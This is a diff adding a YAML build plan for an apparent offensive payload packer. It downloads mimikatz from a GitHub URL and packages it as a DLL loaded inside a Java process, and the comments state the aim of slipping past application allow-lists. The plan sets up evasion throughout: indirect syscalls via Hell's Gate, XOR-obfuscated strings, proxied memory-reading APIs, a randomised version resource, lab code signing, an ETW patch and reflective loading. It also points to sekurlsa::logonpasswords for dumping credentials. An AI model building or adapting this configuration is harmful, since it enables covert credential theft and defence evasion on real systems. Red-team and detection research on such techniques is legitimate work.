@@ -1,0 +1,64 @@
+# mimikatz delivered as a host-loaded DLL: `output.kind: dll` + the Java entry.
+#
+# A DLL is not a program, so a program allow-list (SRP / AppLocker / a GPO that
+# permits an interpreter but blocks new .exe) never applies to the artifact. The
+# chain runs *inside* the host process:
+#
+#   picaro build examples/plans/mimikatz-dll.yaml       # dist/mimikatz.picaro.dll
+#   java -jar load-dll.jar dist/mimikatz.picaro.dll 30000
+#
+# `entry: jni_on_load` matches the Java host (`System.load` calls JNI_OnLoad and
+# returns at once; the JVM owns the process). It is a delivery-shaped choice: the
+# `auto` entry would also advertise `Run`, which no ordinary DLL does. See
+# examples/hosts/java_host/JavaHost.java and docs/hosts.md (Java section).
+#
+# The DLL runs in-process, so it must match java.exe's bitness (mimikatz x64 +
+# a 64-bit JVM here) and it is scanned by the image loader on `System.load` —
+# `output.sign` is the mitigation that matters most in this mode.
+
+schema: 6
+name: mimikatz-dll
+
+build:
+  payloads:
+    mimikatz:
+      source: "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
+      # The payload starts with these; the packed binary's own args follow. A
+      # non-interactive run wants the full command set plus `exit` (e.g.
+      # `sekurlsa::logonpasswords`), because there is no console prompt to type at.
+      args:
+        - "privilege::debug"
+
+  stub:
+    syscalls:
+      mode: indirect
+      resolver: hells_gate
+    strings:
+      strategy: xor
+    # Serve the payload's imports from proxies generated in the loader (needs
+    # syscalls: indirect and a pe/dll payload; reflective_loading only).
+    api_resolution:
+      mode: proxy
+      apis:
+        - "kernel32!ReadProcessMemory"
+        - "kernel32!OpenProcess"
+        - "kernel32!GetProcAddress"
+        - "ntdll!NtReadVirtualMemory"
+        - "ntdll!NtOpenProcess"
+      unmatched: forward
+
+  output:
+    path: ./dist/mimikatz.picaro.dll
+    kind: dll
+    entry: jni_on_load
+    resources:
+      version_info:
+        randomize: true
+    sign:
+      # Generate a lab CA + leaf and sign (the generated company is the subject).
+      mode: lab
+
+runtime:
+  # patch_etw runs in the *host* (java.exe) here — usually the point.
+  - technique: patch_etw
+  - technique: reflective_loading
